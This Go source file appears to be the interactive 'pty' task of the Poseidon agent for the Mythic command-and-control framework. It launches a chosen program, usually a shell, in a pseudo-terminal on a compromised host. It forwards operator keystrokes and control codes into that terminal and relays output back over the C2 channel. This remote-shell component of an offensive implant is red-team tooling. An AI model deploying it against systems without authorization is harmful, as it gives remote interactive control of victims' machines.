package pty

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	"github.com/creack/pty"
	"io"
	"os"
	"os/exec"
	"time"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Args struct {
	ProgramPath string `json:"program_path"`
}

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Args{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	shellBin := args.ProgramPath
	if _, err = os.Stat(shellBin); err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	command := exec.Command(shellBin)
	command.Env = os.Environ()
	outputChannel := make(chan string, 1)
	errorChannel := make(chan string, 1)
	StdinStdoutPTY, err := customPtyStart(command)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	defer func() { _ = StdinStdoutPTY.Close() }() // Best effort.
	pty.Setsize(StdinStdoutPTY, &pty.Winsize{Cols: 80, Rows: 30})

	/*
		oldState, err := terminal.MakeRaw(int(StdinStdoutPTY.Fd()))
		if err != nil {
			fmt.Printf("error saving terminal state: %v\n", err)
			msg.SetError("Could not save terminal state")
			task.Job.SendResponses <- msg
			return
		}
		defer func() { _ = terminal.Restore(int(StdinStdoutPTY.Fd()), oldState) }()

	*/

	doneChannel := make(chan bool, 2)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		// wait for stdin data and pass that along
		for {
			select {
			case inputMsg := <-task.Job.InteractiveTaskInputChannel:
				data, err := base64.StdEncoding.DecodeString(inputMsg.Data)

				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
					continue
				}
				//fmt.Printf("got a message from interactive tasking (%d):\n%s\n", inputMsg.MessageType, data)
				err = nil
				switch inputMsg.MessageType {
				case InteractiveTask.Input:
					_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
				case InteractiveTask.CtrlA:
					_, err = StdinStdoutPTY.Write([]byte{0x01})
				case InteractiveTask.CtrlB:
					_, err = StdinStdoutPTY.Write([]byte{0x02})
				case InteractiveTask.CtrlC:
					_, err = StdinStdoutPTY.Write([]byte{0x03})
				case InteractiveTask.CtrlD:
					_, err = StdinStdoutPTY.Write([]byte{0x04})
				case InteractiveTask.CtrlE:
					_, err = StdinStdoutPTY.Write([]byte{0x05})
				case InteractiveTask.CtrlF:
					_, err = StdinStdoutPTY.Write([]byte{0x06})
				case InteractiveTask.CtrlG:
					_, err = StdinStdoutPTY.Write([]byte{0x07})
				case InteractiveTask.Backspace:
					_, err = StdinStdoutPTY.Write([]byte{0x08})
				case InteractiveTask.Tab:
					if len(data) > 0 {
						_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
					}
					_, err = StdinStdoutPTY.Write([]byte{0x09})
				case InteractiveTask.CtrlK:
					_, err = StdinStdoutPTY.Write([]byte{0x0B})
				case InteractiveTask.CtrlL:
					_, err = StdinStdoutPTY.Write([]byte{0x0C})
				case InteractiveTask.CtrlN:
					_, err = StdinStdoutPTY.Write([]byte{0x0E})
				case InteractiveTask.CtrlP:
					_, err = StdinStdoutPTY.Write([]byte{0x10})
				case InteractiveTask.CtrlQ:
					_, err = StdinStdoutPTY.Write([]byte{0x11})
				case InteractiveTask.CtrlR:
					_, err = StdinStdoutPTY.Write([]byte{0x12})
				case InteractiveTask.CtrlS:
					_, err = StdinStdoutPTY.Write([]byte{0x13})
				case InteractiveTask.CtrlU:
					_, err = StdinStdoutPTY.Write([]byte{0x15})
				case InteractiveTask.CtrlW:
					_, err = StdinStdoutPTY.Write([]byte{0x17})
				case InteractiveTask.CtrlY:
					_, err = StdinStdoutPTY.Write([]byte{0x19})
				case InteractiveTask.CtrlZ:
					_, err = StdinStdoutPTY.Write([]byte{0x1A})
				case InteractiveTask.Escape:
					_, err = StdinStdoutPTY.Write([]byte{0x1B})
					if len(data) > 0 {
						_, err = io.Copy(StdinStdoutPTY, bytes.NewReader(data))
					}
				case InteractiveTask.Exit:
					StdinStdoutPTY.Close()
					command.Process.Kill()
					doneChannel <- true
					return
				default:
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte("Unknown control code")),
						MessageType: InteractiveTask.Error,
					}
					continue
				}
				if err != nil {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(err.Error())),
						MessageType: InteractiveTask.Error,
					}
				}
				//fmt.Printf("successfully sent message along to interactive session\n")
			}
		}
	}()
	go func() {
		bufferedOutput := ""
		bufferedError := ""
		for {
			select {
			case <-doneChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
				}
				return
			case newBufferedOutput := <-outputChannel:
				//fmt.Printf("got new output for buffered channel:\n%s", newBufferedOutput)
				bufferedOutput += newBufferedOutput
			case newBufferedError := <-errorChannel:
				//fmt.Printf("got new error for buffered channel:\n%s", newBufferedError)
				bufferedError += newBufferedError
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedOutput)),
						MessageType: InteractiveTask.Output,
					}
					bufferedOutput = ""
				}
				if bufferedError != "" {
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
						TaskUUID:    task.TaskID,
						Data:        base64.StdEncoding.EncodeToString([]byte(bufferedError)),
						MessageType: InteractiveTask.Error,
					}
					bufferedError = ""
				}

			}
		}
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(1 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	go func() {
		reader := bufio.NewReader(StdinStdoutPTY)
		buff := make([]byte, 1024)
		var totalRead int = 0
		var readError error = nil
		for readError == nil {
			totalRead, readError = reader.Read(buff)
			if readError != nil && readError == io.EOF {
				//fmt.Printf("reached EOF\n")
				return
			} else if readError != nil {
				//fmt.Printf("got an error reading: %v\n", err)
				return
			} else {
				outputChannel <- fmt.Sprintf("%s", string(buff[:totalRead]))
			}
		}
		//fmt.Printf("Finished reading from tty\n")
	}()
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	outputMsg := structs.Response{}
	outputMsg.TaskID = task.TaskID
	outputMsg.Completed = true
	task.Job.SendResponses <- outputMsg
	doneTimeDelayChannel <- true
	doneChannel <- true
	return
}
